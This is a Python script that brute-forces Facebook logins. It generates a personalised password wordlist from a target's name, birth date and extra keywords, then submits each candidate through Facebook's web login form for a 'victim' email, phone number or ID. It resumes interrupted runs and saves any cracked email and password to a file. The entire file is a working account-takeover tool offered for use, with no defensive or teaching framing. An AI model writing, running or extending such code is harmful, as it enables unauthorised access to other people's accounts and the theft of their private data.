import itertools
import sys
import mechanize
import os
import time
from playsound import playsound


def play_alert():
    for x in range(20):
        playsound('beep.mp3')
        time.sleep(2)


def remove_file():
    os.remove('wordlist.txt')


def check_file_exist():
    return os.path.exists('wordlist.txt')


def output(txt, counter, end):
    if counter in range(1000):
        sys.stdout.write('\r' + txt + ' ' + str(counter) + end)
    elif counter in range(1000, 1000000):
        counter = counter / 1000
        sys.stdout.write('\r' + txt + ' ' + str(round(counter, 2)) + ' Kilo' + end)
    else:
        counter = counter / 1000000
        sys.stdout.write('\r' + txt + ' ' + str(round(counter, 2)) + ' Million' + end)


def get_info():
    if check_file_exist():
        remove_file()
    info = []
    first_name = input("Please give me your first name \n")
    info.append(str(first_name))
    last_name = input("Please give me your last name \n")
    info.append(str(last_name))
    day = input("Please give me your birth day\n")
    info.append(str(day))
    month = input("Please give me your birth month\n")
    info.append(str(month))
    year = input("Please give me your birth year\n")
    if len(year) == 4:
        year_short = year[2] + year[3]
        info.append(str(year_short))
    info.append(str(year))
    if input('You want extra text ? [y/n]\n') is 'y':
        while True:
            x = input('Give me the extra text (Tape done to exit)\n  ')
            if x == 'done':
                break
            else:
                info.append(str(x))
    if input('You want to add girls passwords [y/n] \n') is 'y':
        info.append('papati')
        info.append('papa')
        info.append('papaty')
        info.append('mama')
        info.append('mamati')
        info.append('mamaty')
    keywords = list(info)
    if input('You want to add Upper Latter to your wordlist [y/n]\n') is 'y':
        for item in info:
            if item.isnumeric():
                continue
            else:
                item = item.title()
                keywords.append(item)
    return keywords


def is_duplicated(list):
    seen = []
    is_duplicated = False
    for y in list:
        if str(y).lower() in seen:
            is_duplicated = True
        else:
            seen.append(str(y).lower())
    return is_duplicated


def generate_wordliste(info):
    file = open('wordlist.txt', 'w')
    try:
        count = 0
        for i in range(6):
            for y in itertools.product(info, repeat=i):
                if is_duplicated(y):
                    continue
                temp = ''.join(y)
                file.write(temp + '\n')
                count += 1
                output('We generated ', count, ' Password')
    finally:
        file.close()


def setcounter(count):
    counter = open('counter.txt', 'w')
    counter.write(str(count))
    counter.close()


def getcounter():
    counter = open('counter.txt', 'r')
    count = counter.read()
    counter.close()
    return int(count)


def check(email, password):
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.open('https://web.facebook.com/')
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    br.submit()
    if br.geturl() == "https://web.facebook.com/":
        return True
    else:
        return False


def check_login(id):
    count = getcounter()
    set_last(str(id))
    print('''
     ---------------------------------------------
           BRUTE FORCE AT ''' + id + '''      
     ---------------------------------------------
    ''')
    print('We start checking at  ' + str(count))
    try:
        file = open('wordlist.txt', 'r')
        for x, y in enumerate(file):
            if x >= count:
                output('We checked', x, ' Password')
                password = y.strip('\n')
                if check(id, password):
                    print('\nPassword find = ' + password)
                    setcounter(0)
                    remove_last()
                    # play_alert()
                    set_sucess(str(id), str(password))
                    break
    except:
        print('\nExit Script Successful')
        setcounter(x)
    finally:
        file.close()
        setcounter(x)


def set_last(number):
    file = open('last.txt', 'w')
    file.write(number)
    file.close()


def remove_last():
    os.remove('last.txt')


def get_last():
    file = open('last.txt', 'r')
    number = file.read()
    file.close()
    return number


def check_last_exist():
    return os.path.exists('last.txt')


def set_sucess(email, password):
    file = open('password.txt', 'w')
    txt = email + ' : ' + password
    file.write(txt)
    file.close()


def main():
    x = getcounter()
    if x == 0:
        if check_file_exist():
            remove_file()
        if check_last_exist():
            remove_last()
        print('''
                     --------------------------------------
                    |       START GETTING INFORMATION      |
                     --------------------------------------
                    ''')
        info = get_info()
        print('''
                         ---------------------------------------
                        |       START GENERATING PASSWORDS      |
                         ---------------------------------------
                        ''')
        generate_wordliste(info)
        print('''
                         --------------------------------------------
                        |       START BRUTE FORCING INFORMATION      |
                         --------------------------------------------
                        ''')
        id = input('Please give me the victim E-mail OR Phone number OR his id  ')
        check_login(id)
    # elif input('We Stop at ' + str(x) + ' Password, you want to continue [y/n]') is 'n':
    elif check_last_exist():
        last = get_last()
        if input('We Stop at ' + str(x) + ' Password for ' + last + ', you want to continue [y/n]') is 'y':
            check_login(last)
        else:
            setcounter(0)
            if check_last_exist():
                remove_last()
            print('''
                 --------------------------------------
                |       START GETTING INFORMATION      |
                 --------------------------------------
                ''')
            info = get_info()
            print('''
                     ---------------------------------------
                    |       START GENERATING PASSWORDS      |
                     ---------------------------------------
                    ''')
            generate_wordliste(info)
            print('''
                     --------------------------------------------
                    |       START BRUTE FORCING INFORMATION      |
                     --------------------------------------------
                    ''')
            id = input('Please give me the victim E-mail OR Phone number OR his id  ')
            check_login(id)

    else:
        print('Please try to restart scripte')
        setcounter(0)
        if check_last_exist():
            remove_last()


if __name__ == '__main__':
    if sys.version[0] == '3':
        main()
    else:
        print('You must run this script with Python version 3')
